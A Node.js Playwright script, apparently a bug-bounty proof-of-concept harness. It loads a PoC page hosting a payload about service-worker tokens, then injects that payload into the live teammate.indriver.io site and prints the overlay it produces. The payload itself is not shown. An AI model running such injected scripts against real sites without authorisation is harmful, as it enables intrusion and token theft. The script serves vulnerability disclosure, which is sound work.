const { chromium } = require('playwright-core');

(async () => {
  const browser = await chromium.launch({
    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    headless: true,
  });
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
  });
  await context.setExtraHTTPHeaders({ 'X-HackerOne': 'd7a_44' });
  const page = await context.newPage();

  // 1. Check the public UI is live and contains the payload.
  await page.goto('https://amooryx.github.io/teammate-sw-token-poc/', { waitUntil: 'networkidle', timeout: 45000 });
  const ui = await page.evaluate(() => ({
    title: document.title,
    hasPayload: !!document.getElementById('payload-src')?.textContent,
    payloadLength: document.getElementById('payload-src')?.textContent.length || 0,
    bodyText: document.body.innerText.slice(0, 500),
  }));
  console.log('UI:', JSON.stringify(ui, null, 2));

  // 2. Run the exact payload from the UI on the live target, with a synthetic token.
  await page.goto('https://teammate.indriver.io/', { waitUntil: 'domcontentloaded', timeout: 45000 });
  await page.waitForTimeout(3000);
  const fs = require('fs');
  const html = fs.readFileSync('C:\\Users\\amoor\\AppData\\Local\\Temp\\opencode\\teammate-poc-ui\\index.html', 'utf8');
  const m = html.match(/<script type="text\/plain" id="payload-src">([\s\S]*?)<\/script>/i);
  const payload = m ? m[1] : null;
  if (!payload) { console.log('NO PAYLOAD'); await browser.close(); return; }
  console.log('PAYLOAD_LENGTH:', payload.length);

  await page.evaluate(payload);
  await page.waitForTimeout(5000);
  const overlay = await page.evaluate(() => {
    const el = [...document.querySelectorAll('div')].find(d => d.style?.zIndex === '2147483647');
    return el ? el.innerText.slice(0, 1500) : document.body.innerText.slice(0, 1000);
  });
  console.log('OVERLAY:\n' + overlay);

  await browser.close();
})();

